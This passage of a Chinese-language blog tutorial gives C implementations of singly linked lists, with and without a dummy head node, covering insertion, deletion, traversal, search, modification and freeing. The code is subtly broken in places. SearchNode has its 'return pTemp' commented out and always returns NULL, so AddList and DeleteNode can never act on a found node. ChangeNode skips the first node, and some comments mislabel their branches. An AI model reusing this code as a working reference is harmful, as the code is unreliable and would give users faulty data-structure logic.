class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数声明 链表的增、删、查、改；</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddTail</span><span class="params">(<span class="keyword">int</span> n)</span></span>; <span class="comment">//创建链表，在链表中增加一个数据，尾添加</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddHead</span><span class="params">(<span class="keyword">int</span> n)</span></span>; <span class="comment">//创建链表，在链表中增加一个数据，头添加</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddList</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> n)</span></span>; <span class="comment">//在数字index后面添加数字a</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteHead</span><span class="params">()</span></span>; <span class="comment">//头删除</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteTail</span><span class="params">()</span></span>; <span class="comment">//尾删除</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteNode</span><span class="params">(<span class="keyword">int</span> n)</span></span>; <span class="comment">//删除指定节点 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SeekList</span><span class="params">()</span></span>; <span class="comment">//遍历链表——&gt;查</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ChangeNode</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> n)</span></span>; <span class="comment">//将index改为 n  </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FreeList</span><span class="params">()</span></span>; <span class="comment">//链表清空</span></span><br><span class="line"></span><br><span class="line"><span class="function">struct Node* <span class="title">SearchNode</span><span class="params">(<span class="keyword">int</span> n)</span></span>; <span class="comment">//查询指定节点</span></span><br></pre></td></tr></tbody></table></figure><h5 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//节点结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span> <span class="comment">//指向下一个节点的指针</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//链表头尾指针（全局变量）</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">head</span> = <span class="title">NULL</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">tail</span> = <span class="title">NULL</span>;</span></span><br></pre></td></tr></tbody></table></figure><h4 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h4><h5 id="头添加"><a href="#头添加" class="headerlink" title="头添加"></a>头添加</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddHead</span><span class="params">(<span class="keyword">int</span> n)</span> <span class="comment">//创建链表，在链表中增加一个数据，头添加</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//创建一个节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = (<span class="title">struct</span> <span class="title">Node</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">Node</span>));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//节点数据进行赋值</span></span><br><span class="line">pTemp-&gt;a = n;</span><br><span class="line">pTemp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接在链表上</span></span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">NULL</span>)<span class="comment">//链表为空，新节点既是头也是尾巴</span></span><br><span class="line">{</span><br><span class="line">head = pTemp;</span><br><span class="line">tail = pTemp;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">pTemp-&gt;next = head; <span class="comment">//新节点的下一个指向头</span></span><br><span class="line">head = pTemp;<span class="comment">//新节点就是头了</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="尾添加"><a href="#尾添加" class="headerlink" title="尾添加"></a>尾添加</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddTail</span><span class="params">(<span class="keyword">int</span> n)</span> <span class="comment">//创建链表，在链表中增加一个数据，尾添加</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//创建一个节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = (<span class="title">struct</span> <span class="title">Node</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">Node</span>));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//节点数据进行赋值</span></span><br><span class="line">pTemp-&gt;a = n;</span><br><span class="line">pTemp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链接</span></span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">NULL</span> || tail == <span class="literal">NULL</span>)<span class="comment">//空链表，既是头，又是尾</span></span><br><span class="line">{</span><br><span class="line">head = pTemp;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="comment">//不为空，往尾巴上添加</span></span><br><span class="line">{</span><br><span class="line">tail-&gt;next = pTemp;</span><br><span class="line">}</span><br><span class="line">tail = pTemp;<span class="comment">// 尾巴一直指向最后一个节点</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="任意位置添加"><a href="#任意位置添加" class="headerlink" title="任意位置添加"></a>任意位置添加</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddList</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> n)</span><span class="comment">//在数字index后面添加数字n</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"链表为空，没有节点\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">fp</span> = <span class="title">SearchNode</span>(<span class="title">index</span>);</span></span><br><span class="line"><span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"没有指定的节点\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//有此节点，给a创建节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = (<span class="title">struct</span> <span class="title">Node</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">Node</span>));</span></span><br><span class="line">pTemp-&gt;a = n;</span><br><span class="line">pTemp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fp == tail)<span class="comment">//链接到链表上</span></span><br><span class="line">{</span><br><span class="line">tail-&gt;next = pTemp; <span class="comment">//尾巴的下一个，指向新的节点</span></span><br><span class="line">tail = pTemp;  <span class="comment">//新节点是最后一个，变成尾巴</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">pTemp-&gt;next = fp-&gt;next;<span class="comment">//先连</span></span><br><span class="line">fp-&gt;next = pTemp;      <span class="comment">//后断</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><h5 id="头删除"><a href="#头删除" class="headerlink" title="头删除"></a>头删除</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteHead</span><span class="params">()</span> <span class="comment">//头删除</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">NULL</span>)<span class="comment">//检查链表是否为空</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"链表为NULL，无需释放!\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (head == tail)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">free</span>(head);</span><br><span class="line">head = <span class="literal">NULL</span>;</span><br><span class="line">tail = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">struct Node* pTemp = head;<span class="comment">//记住旧的头</span></span><br><span class="line">head = head-&gt;next; <span class="comment">//头的下一个节点变成新的头</span></span><br><span class="line"><span class="built_in">free</span>(pTemp); <span class="comment">//释放旧的头</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="尾删除"><a href="#尾删除" class="headerlink" title="尾删除"></a>尾删除</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteTail</span><span class="params">()</span> <span class="comment">//尾删除</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">NULL</span>)<span class="comment">//检查链表是否为空</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"链表为NULL，无需释放!\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//链表不为空 有一个节点</span></span><br><span class="line"><span class="keyword">if</span> (head == tail)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">free</span>(head);</span><br><span class="line">head = <span class="literal">NULL</span>;</span><br><span class="line">tail = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">//找尾巴前一个节点</span></span><br><span class="line">struct Node* pTemp = head;</span><br><span class="line"><span class="keyword">while</span> (pTemp-&gt;next != tail)</span><br><span class="line">{</span><br><span class="line">pTemp = pTemp-&gt;next;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//找到尾巴 删除并释放</span></span><br><span class="line"><span class="built_in">free</span>(tail);  <span class="comment">//释放尾巴</span></span><br><span class="line">tail = pTemp;<span class="comment">//移动尾巴</span></span><br><span class="line">tail-&gt;next = <span class="literal">NULL</span>;<span class="comment">//尾巴的下一个指针赋值为NULL</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="任意位置删除"><a href="#任意位置删除" class="headerlink" title="任意位置删除"></a>任意位置删除</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteNode</span><span class="params">(<span class="keyword">int</span> n)</span><span class="comment">//删除指定节点 </span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">NULL</span>)<span class="comment">//检查链表是否为空</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"链表为NULL，无需释放!\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//链表有东西，找此节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = <span class="title">SearchNode</span>(<span class="title">n</span>);</span></span><br><span class="line"><span class="keyword">if</span> (pTemp == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"查无此节点\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//找到了</span></span><br><span class="line"><span class="keyword">if</span> (pTemp == head) <span class="comment">//只有一个节点</span></span><br><span class="line">{</span><br><span class="line">DeleteHead();</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pTemp == tail)<span class="comment">//有两个节点</span></span><br><span class="line">{</span><br><span class="line">DeleteTail();</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span><span class="comment">//有多个节点</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">struct Node* fp = head;</span><br><span class="line"><span class="keyword">while</span> (fp-&gt;next != pTemp)</span><br><span class="line">{</span><br><span class="line">fp = fp-&gt;next;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//找到了</span></span><br><span class="line">fp-&gt;next = pTemp-&gt;next;<span class="comment">//连接</span></span><br><span class="line"><span class="built_in">free</span>(pTemp); <span class="comment">//释放</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SeekList</span><span class="params">()</span> <span class="comment">//遍历链表——&gt;查</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = <span class="title">head</span>;</span></span><br><span class="line"><span class="keyword">while</span> (pTemp != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d  "</span>,pTemp-&gt;a);</span><br><span class="line">pTemp = pTemp-&gt;next;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct Node* <span class="title">SearchNode</span><span class="params">(<span class="keyword">int</span> n)</span> <span class="comment">//查询指定节点</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = <span class="title">head</span>;</span></span><br><span class="line"><span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (pTemp != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (n == pTemp-&gt;a)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"第%d个数为%d\n"</span>, num, pTemp-&gt;a);</span><br><span class="line"><span class="comment">//return pTemp;</span></span><br><span class="line">}</span><br><span class="line">pTemp = pTemp-&gt;next;</span><br><span class="line">num++;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">//没找到</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ChangeNode</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> n)</span><span class="comment">//将index改为 n  </span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">fp</span> = <span class="title">head</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;a == index)</span><br><span class="line">{</span><br><span class="line">fp-&gt;a = n;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line">fp = fp-&gt;next;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="清空"><a href="#清空" class="headerlink" title="清空"></a>清空</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FreeList</span><span class="params">()</span> <span class="comment">//链表清空</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = <span class="title">head</span>;</span> <span class="comment">//记录头，防止头被修改，丢内存</span></span><br><span class="line"><span class="keyword">while</span> (pTemp != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">fp</span> = <span class="title">pTemp</span>;</span></span><br><span class="line">pTemp = pTemp-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(fp);</span><br><span class="line">}</span><br><span class="line"><span class="comment">//头尾清空</span></span><br><span class="line">head = <span class="literal">NULL</span>;</span><br><span class="line">tail = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="空头链表"><a href="#空头链表" class="headerlink" title="空头链表"></a>空头链表</h3><p>空头链表和无空头链表其实本质区别不大，空头链表就是头结点为空（有头指针，但是没有数值域）在进行某些操</p><p>作的时候就比较简单；</p><p>空头链表和无空头链表相似度很高，部分操作相同，就不一一列举了；</p><h4 id="头文件-函数声明-结构体-全局变量-1"><a href="#头文件-函数声明-结构体-全局变量-1" class="headerlink" title="头文件+函数声明+结构体+全局变量"></a>头文件+函数声明+结构体+全局变量</h4><h5 id="头文件（根据使用的语言自行修改）-1"><a href="#头文件（根据使用的语言自行修改）-1" class="headerlink" title="头文件（根据使用的语言自行修改）"></a>头文件（根据使用的语言自行修改）</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><h5 id="函数声明-1"><a href="#函数声明-1" class="headerlink" title="函数声明"></a>函数声明</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct Node* <span class="title">CreateNode</span><span class="params">(<span class="keyword">int</span> n)</span></span>;<span class="comment">//创建节点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NewList</span><span class="params">()</span></span>;<span class="comment">//空头链表初始化</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddHead</span><span class="params">(<span class="keyword">int</span> n)</span></span>; <span class="comment">// 头添加</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddTail</span><span class="params">(<span class="keyword">int</span> n)</span></span>; <span class="comment">//尾添加</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddRand</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> n)</span></span>;<span class="comment">//在数字index后面添加数字a</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteHead</span><span class="params">()</span></span>;<span class="comment">//删除头</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteTail</span><span class="params">()</span></span>;<span class="comment">//删除尾</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteNode</span><span class="params">(<span class="keyword">int</span> n)</span></span>;<span class="comment">//删除指定节点</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SeekList</span><span class="params">()</span></span>; <span class="comment">//遍历</span></span><br><span class="line"><span class="function">struct Node* <span class="title">SearchNode</span><span class="params">(<span class="keyword">int</span> n)</span></span>; <span class="comment">//查找指定节点，并返回节点地址</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FreeList</span><span class="params">()</span></span>;<span class="comment">//释放链表</span></span><br></pre></td></tr></tbody></table></figure><h5 id="结构体-1"><a href="#结构体-1" class="headerlink" title="结构体"></a>结构体</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//节点结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span> <span class="comment">//指向下一个节点的指针</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="全局变量-1"><a href="#全局变量-1" class="headerlink" title="全局变量"></a>全局变量</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//链表头尾指针（全局变量）</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">head</span> = <span class="title">NULL</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">tail</span> = <span class="title">NULL</span>;</span></span><br></pre></td></tr></tbody></table></figure><h4 id="空头链表初始化"><a href="#空头链表初始化" class="headerlink" title="空头链表初始化"></a>空头链表初始化</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NewList</span><span class="params">()</span><span class="comment">//空头链表初始化</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//链表空头</span></span><br><span class="line">head = (struct Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct Node));</span><br><span class="line">head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">tail = head;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="创建节点"><a href="#创建节点" class="headerlink" title="创建节点"></a>创建节点</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct Node* <span class="title">CreateNode</span><span class="params">(<span class="keyword">int</span> n)</span><span class="comment">//创建节点</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = (<span class="title">struct</span> <span class="title">Node</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">Node</span>));</span><span class="comment">//创建一个节点</span></span><br><span class="line"><span class="keyword">if</span> (pTemp == <span class="literal">NULL</span>)<span class="comment">//创建失败</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">pTemp-&gt;a = n; <span class="comment">//节点成员赋值</span></span><br><span class="line">pTemp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> pTemp;<span class="comment">//返回节点</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="添加-1"><a href="#添加-1" class="headerlink" 